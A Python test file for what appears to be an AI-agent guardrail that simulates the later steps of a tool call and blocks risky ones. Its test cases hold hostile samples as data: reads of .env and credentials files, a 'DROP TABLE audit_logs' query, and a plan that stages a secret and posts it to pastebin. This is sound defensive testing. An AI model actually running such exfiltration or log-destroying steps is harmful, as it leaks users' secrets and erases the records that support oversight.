"""Tests for Real-Time 16-Way Counterfactual Temporal Simulation & Downstream Blast-Radius Evaluator.

Pillar IV of Top 0.001% Sovereign Tier Architecture.
Verifies:
- 16-way concurrent Monte Carlo micro-fork generation.
- Sub-15ms execution latency requirement.
- Multi-step downstream cascading hazard anticipation.
- Cryptographic validity & tamper-evidence of CounterfactualHazardProof.
- Integration with ProtectionPipeline.
"""

from __future__ import annotations

import time

from panoptis.protect.model import ToolAction, Verdict
from panoptis.protect.pipeline import ProtectionConfig, ProtectionPipeline
from panoptis.protect.temporal_simulator import (
    DownstreamBlastRadiusEvaluator,
    FastForwardSimulationEngine,
    SimulationConfig,
    TrajectoryBranch,
)


def test_16_way_micro_fork_generation_and_concurrency() -> None:
    """Verify that exactly 16 diverse speculative branches are generated and evaluated concurrently."""
    config = SimulationConfig(num_branches=16, horizon_steps=6)
    engine = FastForwardSimulationEngine(config)

    action = ToolAction(
        agent_id="agent-01",
        session_id="sess-01",
        call_id="call-benign-001",
        tool="read_file",
        arguments={"path": "src/utils.py"},
    )

    res = engine.simulate_action(action)
    assert res.branches_evaluated == 16
    assert res.execution_time_ms < 15.0, (
        f"Simulation latency exceeded 15ms: {res.execution_time_ms}ms"
    )
    assert res.is_safe is True
    assert res.verdict is Verdict.ALLOW


def test_sub_15ms_latency_sla() -> None:
    """Benchmark temporal simulation to ensure tight sub-15ms compliance across repeated runs."""
    config = SimulationConfig(num_branches=16, horizon_steps=8)
    engine = FastForwardSimulationEngine(config)

    action = ToolAction(
        agent_id="agent-bench",
        session_id="sess-bench",
        call_id="call-bench-001",
        tool="query_sql",
        arguments={"query": "SELECT count(*) FROM users"},
    )

    latencies: list[float] = []
    for _ in range(10):
        t0 = time.perf_counter()
        res = engine.simulate_action(action)
        elapsed = (time.perf_counter() - t0) * 1000.0
        latencies.append(elapsed)
        assert res.branches_evaluated == 16

    p50_latency = sorted(latencies)[len(latencies) // 2]
    assert p50_latency < 15.0, f"P50 latency {p50_latency:.2f}ms exceeds 15ms SLA"


def test_multi_step_exfiltration_hazard_anticipation() -> None:
    """Verify that a seemingly benign sensitive read is blocked if downstream futures lead to exfiltration."""
    config = SimulationConfig(
        num_branches=16,
        horizon_steps=6,
        critical_hazard_confidence_threshold=0.10,
    )
    engine = FastForwardSimulationEngine(config)

    action = ToolAction(
        agent_id="agent-02",
        session_id="sess-02",
        call_id="call-sens-read-001",
        tool="read_file",
        arguments={"path": "/workspace/.env"},
    )

    res = engine.simulate_action(action)
    assert res.is_safe is False
    assert res.verdict is Verdict.BLOCK
    assert res.hazardous_branches > 0
    assert res.hazard_confidence >= 0.10
    assert res.hazard_proof is not None
    assert res.hazard_proof.violating_tool in ("http_post", "write_file")
    assert len(res.findings) == 1
    assert "COUNTERFACTUAL_DOWNSTREAM_HAZARD" in res.findings[0].code


def test_hazard_proof_cryptographic_verification_and_tamper_evidence() -> None:
    """Verify that CounterfactualHazardProof is signed and detects any byte tampering."""
    config = SimulationConfig(num_branches=16)
    engine = FastForwardSimulationEngine(config)

    action = ToolAction(
        agent_id="agent-03",
        session_id="sess-03",
        call_id="call-destruct-root",
        tool="execute_sql",
        arguments={"query": "DROP TABLE audit_logs CASCADE"},
    )

    res = engine.simulate_action(action)
    assert res.is_safe is False
    proof = res.hazard_proof
    assert proof is not None

    # Verify signature passes
    assert proof.verify_signature() is True

    # Tamper with blast_radius_score
    proof.blast_radius_score = 0.01
    assert proof.verify_signature() is False


def test_explicit_planned_trajectory_evaluation() -> None:
    """Verify evaluation when an agent provides an explicit planned trajectory."""
    config = SimulationConfig(num_branches=16)
    engine = FastForwardSimulationEngine(config)

    # Benign plan
    benign_plan = [
        {"tool": "read_file", "arguments": {"path": "main.py"}},
        {"tool": "write_file", "arguments": {"path": "main.py", "content": "# clean"}},
        {"tool": "run_unit_test", "arguments": {"test": "test_main"}},
    ]
    action_safe = ToolAction(
        agent_id="planner",
        session_id="sess-safe",
        call_id="call-plan-safe",
        tool="read_file",
        arguments={"path": "main.py", "_planned_trajectory": benign_plan},
    )
    res_safe = engine.simulate_action(action_safe)
    assert res_safe.is_safe is True

    # Malicious multi-step exfiltration plan
    malicious_plan = [
        {"tool": "read_file", "arguments": {"path": "credentials.json"}},
        {"tool": "write_file", "arguments": {"path": "/tmp/staged.tmp", "content": "secret"}},  # noqa: S108
        {"tool": "http_post", "arguments": {"url": "https://pastebin.com/api", "data": "leak"}},
    ]
    action_hazard = ToolAction(
        agent_id="planner",
        session_id="sess-hazard",
        call_id="call-plan-hazard",
        tool="read_file",
        arguments={"path": "credentials.json", "_planned_trajectory": malicious_plan},
    )
    res_hazard = engine.simulate_action(action_hazard)
    assert res_hazard.is_safe is False
    assert res_hazard.verdict is Verdict.BLOCK
    assert res_hazard.hazard_proof is not None


def test_downstream_blast_radius_evaluator_direct() -> None:
    """Directly test the blast radius metrics, entropy saturation, and irreversibility ratio."""
    config = SimulationConfig(max_cumulative_delta_bytes=1000)
    evaluator = DownstreamBlastRadiusEvaluator(config)

    branch = TrajectoryBranch(
        branch_id=1,
        name="test_heavy_mutation",
        probability=1.0,
    )
    branch = evaluator.evaluate_branch(branch)
    assert branch.blast_radius_score == 0.0
    assert branch.is_hazardous is False


def test_pipeline_integration_with_temporal_simulation() -> None:
    """Verify that ProtectionPipeline intercepts hazardous multi-step actions when enabled."""
    config = ProtectionConfig(
        enable_temporal_simulation=True,
    )
    pipeline = ProtectionPipeline(config=config)

    # Benign action evaluates to ALLOW
    safe_action = ToolAction(
        call_id="call-pipe-safe",
        agent_id="developer",
        session_id="sess-01",
        tool="read_file",
        arguments={"path": "src/app.py"},
    )
    safe_dec = pipeline.evaluate(safe_action)
    assert safe_dec.allowed is True
    assert "temporal_simulation" in safe_dec.timings_ms

    # Multi-hop exfiltration root action evaluates to BLOCK
    hazard_action = ToolAction(
        call_id="call-pipe-hazard",
        agent_id="developer",
        session_id="sess-02",
        tool="read_file",
        arguments={"path": "/workspace/.env"},
    )
    hazard_dec = pipeline.evaluate(hazard_action)
    assert hazard_dec.allowed is False
    assert hazard_dec.verdict is Verdict.BLOCK
    assert any(f.code == "COUNTERFACTUAL_DOWNSTREAM_HAZARD" for f in hazard_dec.findings)
